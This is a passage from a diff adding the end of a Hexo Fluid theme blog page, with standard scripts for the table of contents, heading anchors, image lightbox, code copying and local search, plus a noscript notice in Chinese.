+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
